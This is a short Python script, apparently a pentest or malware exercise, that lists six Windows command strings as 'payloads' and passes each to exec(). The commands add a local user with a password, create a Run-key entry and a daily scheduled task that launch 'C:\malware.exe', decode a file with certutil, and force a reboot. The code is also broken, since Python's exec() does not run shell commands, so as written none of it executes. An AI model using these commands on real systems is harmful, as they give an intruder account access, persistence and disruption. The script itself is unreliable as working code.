import os

payload1 = "echo hello > test.txt"
payload2 = "net user pentest Pass123! /add"
payload3 = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d \"C:\malware.exe\" /f"
payload4 = "certutil -f -decode file.txt decodedfile.txt"
payload5 = "shutdown /r /t 0 /f"
payload6 = "schtasks /create /tn PentestTask /tr C:\malware.exe /sc daily /st 12:00"

exec(payload1)
exec(payload2)
exec(payload3)
exec(payload4)
exec(payload5)
exec(payload6)